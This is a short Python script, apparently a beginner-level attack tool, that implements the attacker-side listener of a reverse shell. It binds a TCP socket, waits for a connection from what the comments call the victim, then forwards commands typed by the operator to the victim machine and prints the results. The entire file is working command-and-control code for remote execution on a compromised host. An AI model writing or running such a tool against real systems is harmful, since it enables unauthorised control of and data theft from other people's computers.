# Server (attacker) side script

# Import all classes from the Socket and system modules
from socket import *
from sys import *

# Setup host paramters
host = '127.0.0.1'  # IP
port = 1234        # port
s = ''             # initializion of the variable s globally, will be used as the socket object

# Reverse shell function


def reverseShellServer():

    global host
    global port
    global s

    # Try creating a socket object and throw an exception if an error occured
    try:
        s = socket(AF_INET, SOCK_STREAM)
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

    # Try binding with the socket object and listen for incoming connections, and throw an exception if an error occured
    try:
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket Binding error" + str(msg))

    # Accepting incoming client connections
    connection, address = s.accept()
    # Print the client (victim) info
    print("Connection has been established! |" + " IP " +
          address[0] + " | Port" + str(address[1]))

    # Calling the commanding function
    sendCommands(connection)

    # Closing the connection
    connection.close()

# The commanding function where the attacker sends commands to be executed at the victim


def sendCommands(connection):
    while True:
        # Get the input
        cmd = input()

        # If the input command is quit, close the connection and close the socket
        if cmd == 'quit':
            connection.close()
            s.close()
            exit()

        # If any command, send it to the victim
        if len(str.encode(cmd)) > 0:
            # Send the command to the victim
            connection.send(str.encode(cmd))
            # Get the response
            client_response = str(connection.recv(1024), "utf-8")
            # Print the response
            print(client_response, end="")


def main():
    reverseShellServer()


main()
